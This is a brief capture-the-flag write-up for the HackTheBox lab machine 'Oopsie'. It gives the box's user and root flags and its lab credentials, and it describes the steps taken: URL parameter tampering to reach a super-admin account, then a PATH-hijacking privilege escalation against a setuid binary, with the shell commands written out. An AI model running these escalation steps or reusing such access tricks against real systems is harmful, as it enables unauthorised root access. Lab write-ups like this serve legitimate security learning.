# HackTheBox  Oopsie(starting-point)

> Saikat Karmakar | Mar 5:2021

> ip : 10.10.10.28

-------------------------------------------------------------------------------

1. user flag
```
f2c74ee8db7983851ab2a96a44eb7981
```
2. root flag
```
af13b0bee69f8a877c3faf667f7beacf
```

--
-----------
***Notes***
-----------
url -> http://megacorp.com/cdn-cgi/login
creds
```
user : admin 
pass : MEGACORP_4dm1n!!
```
super-admin id = 30
/cdn-cgi/login/admin.php?content=accounts&id=30 
super-admin = 86575

box creds in db.php
```
user : robert
pass : M3g4C0rpUs3r!
```

find / -group bugtracker -type f 2>/dev/null
/usr/bin/bugtracker
this file calling the `cat` from relative path.So create a malicious cat 
```
export PATH=/tmp:$PATH
cd /tmp/
echo '/bin/bash' > cat
chmod +x cat
```
run the file get the root
